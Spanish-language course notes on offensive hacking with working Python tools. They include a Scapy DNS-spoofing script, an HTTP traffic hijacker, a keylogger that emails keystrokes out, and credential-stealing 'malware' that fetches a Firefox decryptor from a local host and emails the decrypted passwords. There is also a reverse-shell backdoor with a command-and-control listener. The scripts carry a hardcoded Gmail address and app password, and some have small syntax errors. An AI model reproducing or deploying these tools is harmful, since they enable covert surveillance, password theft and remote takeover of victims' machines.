Al configurar iptables para enviar los paquetes DNS a NFQUEUE, podemos utilizar Scapy para inspeccionar y modificar estos paquetes. Por ejemplo, cuando la víctima intenta resolver un dominio, podemos cambiar la respuesta para que la IP resuelta sea la nuestra, no la legítima. Esto permite realizar ataques de tipo Man-In-The-Middle, donde redirigimos al usuario a un servidor bajo nuestro control en lugar del servidor real, lo que puede ser utilizado para una variedad de propósitos maliciosos, como phishing o inyección de contenido.

Los comandos para la configuración de iptables es:
```bash
sudo iptables -I INPUT -j NFQUEUE --queue-num 0

sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0

sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

# Esta ultima es para que nos permita redirigit las peticiones al servidor

sudo iptables --policy FORWARD ACCEPT

# Tambien tenemos que instalar netfilterqueue con el siguiente comando:

sudo apt install libnetfilter-queue-dev

pip3 install netfilterqueue


# Restaurar las IPtables seria:

sudo iptables -D INPUT -j NFQUEUE --queue-num 0

sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0

sudo iptables -D FORWARD -j NFQUEUE --queue-num 0

sudo iptables --policy FORWARD ACCEPT

```

Esta clase te brindará una comprensión profunda y habilidades prácticas en la manipulación del tráfico de red y en la ejecución de ataques de spoofing DNS, una técnica poderosa en el arsenal de ciberseguridad ofensiva.


```python
#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import sys
from termcolor import colored
import signal


def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo.....\n", "red"))
    sys.exit(1)


sig = signal.signal(signal.SIGINT, def_handler)


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if b"hack4u.io" in qname:
            print(f"[+] Envenenando el dominios hack4u.io")

            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.67")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            
            packet.set_payload(scapy_packet.build())


    packet.accept()


queue = netfilterqueue.NetfilterQueue() # intancio un objeto del packete
queue.bind(0, process_packet) # Nos permite asociarnos a un numero de colo, en este caso el 0 y cada packete los trato en la función procces_packet
queue.run() # Esto se encuentra corriendo en espera.
```

## **Creando un Manipulador e Interceptor de Tráfico (Traffic Hijacking)**

En esta clase, nos enfocaremos en crear un Manipulador e Interceptor de Tráfico, también conocido como **Traffic Hijacking**, una técnica avanzada en ciberseguridad ofensiva. El objetivo es aprender a controlar y alterar el tráfico de red para manipular lo que un usuario ve en respuesta a sus acciones en la web.

Para lograr esto, utilizaremos de nuevo la herramienta NetfilterQueue en combinación con iptables. NetfilterQueue nos permite interceptar paquetes que pasan por la red y manipularlos antes de que continúen su camino. Mediante iptables, redirigiremos el tráfico relevante (como las solicitudes HTTP/HTTPS) a una cola NFQUEUE, donde podremos inspeccionar y modificar estos paquetes utilizando un script personalizado.

Una aplicación práctica de esta técnica es alterar las respuestas de las solicitudes web. Por ejemplo, cuando un usuario solicita una página web, podemos interceptar la respuesta del servidor y modificarla antes de que llegue al usuario. Esto puede incluir cambiar textos, insertar scripts maliciosos, redirigir a sitios de phishing, entre otros. Es una forma poderosa de controlar la experiencia del usuario en la web y puede ser utilizada para una variedad de propósitos malintencionados.

Esta clase te proporcionará las habilidades y el conocimiento necesarios para realizar ataques de hijacking de tráfico, enseñándote cómo manipular el tráfico de red en tiempo real para alterar la información que recibe el usuario final.

```python
#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len # eliminamos los paquetes encargados de comprobar la integridad de el envio
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    print(packet.show())

    return packet

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload()) # convertimos el packete para que scapy lo pueda interpretar

    if scapy_packet.haslayer(scapy.Raw): # Filgramos por los paqueste que contengan raw
        try:
            if scapy_packet[scapy.TCP].dport == 80: # filtramos por los paquetes que en su capa TCP en dport se envien por el puerto 80(http)
                print(f"\n[+] Solicitud:\n")
                modifed_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load) #Modificamos la carga para evitar que esto se envie
                new_packet = set_load(scapy_packet, modifed_load) # con otroa función moificamos el packete
                packet.set_payload(new_packet.build()) # Enviamos el packete ya modificado

            elif scapy_packet[scapy.TCP].sport == 80: # filtramos por los paquetes que en su capa TCP en sport se envie por el puerto 80(http)
                print(f"\n[+] Respuesta del servidor: \n")

                modifed_load = scapy_packet[scapy.Raw].load.replace(b"<a href=\"https://www.acunetix.com/vulnerability-scanner/\">", b"<a href=\"https://facebook.com/\">") # modificamos la carga
                new_packet = set_load(scapy_packet, modifed_load) # generamos un nuevo packete
                packet.set_payload(new_packet.build()) # remplazamos el nuevo packete por el quen o tiene modificaciones

        except Exception as e:
            print(f"\n[!] Error: {e}")

    packet.accept()


quue = netfilterqueue.NetfilterQueue() # instancio 
quue.bind(0, process_packet) # con bind nos asociamos el numero de identificador que seria el 0, y tratamos los packets en la función process_packet
quue.run() # Mantenemos un bucle en escucha 
```

## **Creando un Keylogger**

En esta clase, nos adentraremos en la creación de un **keylogger**, una herramienta fundamental en el mundo de la ciberseguridad ofensiva. Para esto, utilizaremos la biblioteca **pynput** de Python, que es una herramienta efectiva para monitorear y registrar las pulsaciones de teclado.

**Pynput** es una biblioteca que nos permite controlar y monitorear la entrada del usuario desde el teclado y el ratón. En el contexto de un keylogger, nos centraremos en la capacidad de pynput para registrar cada tecla presionada en el teclado. Esto es especialmente útil en escenarios de ciberseguridad ofensiva, donde la recopilación de pulsaciones de teclas puede revelar información sensible como contraseñas, mensajes privados o cualquier otro tipo de datos ingresados a través del teclado.

El aspecto clave de esta clase será no solo registrar estas pulsaciones, sino también aprender a enviar esta información de manera automática y discreta por correo electrónico. Esto implica configurar un sistema que agrupe las pulsaciones de teclas capturadas y las envíe periódicamente a una dirección de correo electrónico especificada. Esta funcionalidad aumenta la eficacia del keylogger, permitiéndonos acceder a la información capturada de forma remota y continua, lo cual es crucial para operaciones prolongadas de vigilancia o recopilación de datos.

Te guiaremos a través de todo el proceso de configuración del keylogger, desde la captura de las pulsaciones de teclas hasta la implementación del sistema de envío de correos electrónicos, proporcionándote una comprensión completa de cómo se pueden utilizar estas herramientas en escenarios de ciberseguridad ofensiva.

En esta clase, finalizaremos nuestra herramienta de keylogger desarrollada con la biblioteca **pynput** de Python. Esta sesión se centrará en perfeccionar y completar las funcionalidades del keylogger, asegurándonos de que sea eficiente, discreto y totalmente operativo.

El aspecto principal que abordaremos será la optimización del proceso de captura de pulsaciones de teclas y el mecanismo de envío automático de estas por correo electrónico. Refinaremos la programación para que el keylogger funcione de manera fluida y eficaz, minimizando su detectabilidad y maximizando la calidad y relevancia de los datos capturados. Además, nos aseguraremos de que el sistema de envío de correos electrónicos sea seguro y confiable, para que las pulsaciones registradas lleguen periódicamente a la dirección de correo especificada sin problemas.

También cubriremos aspectos avanzados, como la configuración de intervalos de tiempo para el envío de correos, la gestión de errores y la optimización del rendimiento del keylogger para garantizar que funcione de manera efectiva en diferentes escenarios. Al final de esta clase, tendrás una herramienta de keylogging robusta y práctica, lista para ser desplegada en situaciones reales de ciberseguridad ofensiva, con un entendimiento claro de cómo operarla y adaptarla a tus necesidades específicas.

```python
#!/usr/bin/env python3

import email
import pynput.keyboard # a traves de esta libreria vamos a encargarnos de identificar las pulsaciones del teclado
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:

    def __init__(self):
        self.log = ""
        self.requests_shutdown = False
        self.timer = None
        self.is_first_run = True

    def format_string(self, string):

        self.log = string[:-1] #NOs ayuda a eliminar espacios o letras cuando de la lisa al pulsar backspace

    def pressed_key(self, key):
        try:
            self.log += str(key.char) #Siempre que seann letras o numeros se agrega

        except AttributeError:

            special_keys = {pynput.keyboard.Key.space: " ", pynput.keyboard.Key.enter: " Enter ",
                        pynput.keyboard.Key.shift: "", pynput.keyboard.Key.ctrl: "", pynput.keyboard.Key.alt: ""
                        }

            if key == pynput.keyboard.Key.backspace:
                self.format_string(self.log)
                pass
            else:
                self.log += str(special_keys.get(key, f" {str(key)} ")) # Agregamos dependiendo del diccionario

    # Logica para el envio de mensajes por correo
    def send_email(self, subject, body, sender,recipients, password):
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Email sent Successfully!\n")


    def report(self):
        email_body = "[+] El Keylogger se a iniciado exitosamente." if self.is_first_run else self.log #
        self.send_email("Kelloger Report", email_body, "starkhacking21@gmail.com", ["starkhacking21@gmail.com"], "q m m p a q r e p q v m o k h v") # enviamos los parametros para enviar el email

        if self.is_first_run: # esto nos permite controlar el primer mesaje para saver si ya comenzo la ejecución del keylogger
            self.is_first_run = False

        if not self.requests_shutdown:
            self.timer = threading.Timer(30, self.report) # En esta función aplicamos recurcividad y se ejecuta la misma función cada 5 segundos gracias a timer.
            self.timer.start() #comienza el timer



    def shutdown(self):
        self.requests_shutdown = True

        if self.timer: # osea si esta activo entra en el condicional.
            self.timer.cancel() # Nos permite acavar con la ultima traza ejecutada

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) # En este punto definimos el objeto, el cual con on_press vamos a enviar cada que pusemos una tecla a una función

        with keyboard_listener: # co el manejador de packeques ya no es nesesario el cerrar o terminar
            self.report()
            keyboard_listener.join() # Esto comienza el listener

```

```python
#!/usr/bin/env python3

from keylogger import Keylogger
import sys
import signal
from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo.........", 'red'))
    my_keylogger.shutdown()
    sys.exit(1)

sig = signal.signal(signal.SIGINT, def_handler)


if __name__ == "__main__":
    my_keylogger = Keylogger()
    my_keylogger.start()
```

## **Creación de Malware**

En esta clase, nos centraremos en la creación de un malware diseñado para obtener y enviar las credenciales almacenadas en Firefox por correo electrónico en texto claro. Este ejercicio proporcionará una comprensión práctica de cómo se pueden explotar las aplicaciones comunes para acceder a información sensible.

Nuestro primer paso será trabajar con el archivo ‘**logins.json**‘ de Firefox, donde se almacenan las credenciales de los usuarios de manera cifrada. Aprenderemos a localizar y acceder a este archivo, entenderemos su estructura y, lo más importante, cómo podemos descifrar estas credenciales almacenadas para obtener la información en texto claro.

Después de extraer las credenciales, el siguiente paso será programar la funcionalidad para enviar esta información por correo electrónico. Este proceso garantizará que las credenciales recopiladas se transmitan de manera eficiente y segura al atacante.

Por último, convertiremos nuestro script de Python en un archivo ejecutable ‘**.exe**‘ usando PyInstaller. Este paso es crucial para asegurarnos de que nuestro malware pueda operar en sistemas Windows. Además, el malware que desarrollaremos en esta clase no será detectado por Windows Defender, lo que demuestra una aplicación práctica de cómo se pueden diseñar programas maliciosos para pasar inadvertidos por las medidas de seguridad estándar.

Al concluir esta clase, tendrás una visión clara de cómo se crea y se implementa malware en entornos reales y cómo se puede acceder y transmitir datos sensibles de manera encubierta.

```python
#!/usr/bin/env python3
# coding: cp850

import subprocess
import smtplib
from email.mime.text import MIMEText
import requests
import tempfile
import os
import sys

def run_command(command):

    try:
        output = subprocess.check_output(command, shell=True)
        return output.decode("cp850").strip() if output else None
        
    except Exception as e:
        print(f"\n[!] Error al ejecutar el comando {command}. Err: {e}")
        return None
  

def send_email(subject, body, sender,recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)


        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Email sent Successfully!\n")

def get_Navegator_profiles(username):
    path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"

    try:
        profiles = [profile for profile in os.listdir(path) if "release" in profile]
        return profiles[0] if profiles else None
        
    except Exception as e:
        print(f"\n[!] No ha sido prosible obtener los profiles de Firefox: {e}")
        return None

  

def get_firefox_passwords(username, profile):

    r = requests.get("http://192.168.1.109/firefox_decrypt.py")
    temp_dir = tempfile.mkdtemp()
    os.chdir(temp_dir)
  

    with open("firefox_decrypt.py", "wb") as f:
        f.write(r.content)

    command = f"python firefox_decrypt.py C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}"
    passwords = run_command(command)
    os.remove("firefox_decrypt.py")
    return passwords
  
  

def main():

    username_str = run_command("whoami"
    username = username_str.split("\\")[1]
    profiles = get_Navegator_profiles(username)
  

    if not username or not profiles:
        sys.exit(f"\n[!] No ha sido posible obtener el nombre de usuario o prefiles válidos para Firefox")

    passwords = get_firefox_passwords(username, profiles)

    if passwords:

        send_email("Decrypted Firefox Passwords", passwords, "starkhacking21@gmail.com", ["starkhacking21@gmail.com"], "q m m p a q r e p q v m o k h v") # enviamos los parametros para enviar el email

    else:
        print(f"No encontramos contraseñas"

if __name__ == "__main__":

    main()
```

## **Creación de Backdoors y Command and Control (C&C)**

En esta clase, nos adentraremos en el mundo de los backdoors y los sistemas de Command and Control (**C&C**). Nuestro objetivo será crear un ejemplo práctico de un ejecutable que, una vez en la máquina víctima, nos permita operar desde un centro de comando y control creado manualmente en Python. Esta herramienta nos dará la capacidad de controlar y ejecutar una variedad de operaciones en la máquina comprometida de forma automática.

El backdoor que desarrollaremos actuará como una puerta trasera en la máquina objetivo, proporcionándonos acceso remoto y control sobre el sistema. Por otro lado, el sistema C&C será el centro de operaciones desde donde enviaremos comandos y recibiremos información de la máquina infectada. Este sistema es esencial en operaciones ofensivas avanzadas, ya que nos permite gestionar múltiples backdoors y coordinar acciones complejas en los sistemas comprometidos.

Durante la clase, exploraremos cómo se pueden diseñar y desplegar backdoors eficaces y cómo se estructura un sistema C&C para maximizar su efectividad. También abordaremos la importancia de los sistemas C2 (Command and Control) en la ciberseguridad ofensiva, especialmente en lo que respecta a la automatización y la gestión remota de tareas en máquinas comprometidas.

Esta sesión te proporcionará conocimientos prácticos y habilidades esenciales para entender y desarrollar sistemas de backdoors y C&C, herramientas fundamentales para cualquier operación ofensiva en el ámbito de la ciberseguridad.

Listener.py

```python
#!/usr/bin/env python3

import tempfile
import socket
import signal
import sys
from termcolor import colored
from email.mime.text import MIMEText
import smtplib
import re




def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo.......\n", 'red'))
    sys.exit(1)

sig = signal.signal(signal.SIGINT, def_handler)


class Listener:

    def __init__(self, ip, port):

        self.options = {"get users": "List System Valid users(Gmail)", "help": "Show help panel", "firefox info": "firefox decripted info(Gmail)"}
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("192.168.1.109", 443))
        server_socket.listen()

        print(colored(f"[+] En espera de conexiones: ", 'blue'))
        self.clientent_socket, client_addres = server_socket.accept()
        print(colored(f"\n[+] Conexion establecida con {client_addres}\n", 'green'))

    def execute_remote(self, command):
        self.clientent_socket.send(command.encode())

        return self.clientent_socket.recv(6144).decode()

    def get_users(self):
        self.clientent_socket.send(b"net user")
        output_command = self.clientent_socket.recv(6144).decode()
        self.send_email("Users List Info", output_command, "starkhacking21@gmail.com", ["starkhacking21@gmail.com"], "q m m p a q r e p q v m o k h v") # enviamos los parametros para enviar el email


    def send_email(self, subject, body, sender,recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)


        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Email sent Successfully!\n")

    def show_help(self):
        for key, value in self.options.items():
            print(f"{key} = {value}\n")

    def firefox_passwords(self, username):
        self.clientent_socket.send(f"dir C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles".encode())
        output_command = self.clientent_socket.recv(2048).decode()

        print(output_command)

    def run(self):

        while True:
            command = input(colored(">> ", 'blue'))

            if command == "get users":
                self.get_users()
            elif command == "help":
                self.show_help()

            elif command == "firefox info":
                user = input("Digite el username: ")
                self.firefox_passwords(user)

            else:
                command_output = self.execute_remote(command)
                print(command_output)


def main():
    my_listener = Listener("192.168.1.109", 443)
    my_listener.run()

if __name__ == "__main__":
    main()
```

backdor.py:

```python

#!/usr/bin/evn python3
import socket
import subprocess

def run_command(command):

    command_output = subprocess.check_output(command, shell=True)

    return command_output.decode("cp850").strip()

  
  

def main():

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("192.168.1.109", 443))

    while True:

      try:
        command = client_socket.recv(2048).decode().strip()
        command_output = run_command(command).encode()
        client_socket.send(b"\n" + command_output + b"\n")

      except Exception as e:
        client_socket.send(b"[!] Command not foutd.....")

    client_socket.close()

if __name__ == "__main__":

    main()
```

## **Creación de Forward Shell**

En esta clase, nos centraremos en la creación de una **Forward Shell**, una solución alternativa cuando las opciones más comunes, como las reverse shells, no son viables debido a restricciones como las reglas de firewall.

La Forward Shell es una técnica ingeniosa que se utiliza en situaciones donde, a pesar de tener acceso a un sistema a través de una webshell u otro método, no podemos establecer una reverse shell debido a las restricciones impuestas por el firewall del sistema objetivo. En estos casos, la Forward Shell nos permite ejecutar comandos y obtener una shell interactiva utilizando métodos alternativos que no requieren establecer una conexión TCP directa con el sistema de la forma tradicional.

Una de las claves de esta técnica es el uso de **mkfifo**, una herramienta para crear named pipes (tuberías con nombre) en sistemas Unix/Linux. Mediante estas tuberías, podemos establecer una comunicación bidireccional entre la máquina atacante y la máquina objetivo, permitiendo una interacción más fluida y completa con la shell del sistema comprometido. Esto nos brinda una mayor movilidad y flexibilidad para operar, incluso en entornos restringidos.

En esta clase, te enseñaremos cómo implementar esta técnica, desde la configuración inicial hasta la ejecución práctica, proporcionando una alternativa valiosa para obtener acceso interactivo a sistemas protegidos por firewalls estrictos. Al finalizar, tendrás una comprensión profunda de cómo se pueden utilizar las Forward Shells en escenarios donde las técnicas convencionales de shell inversa no son posibles.

```python

```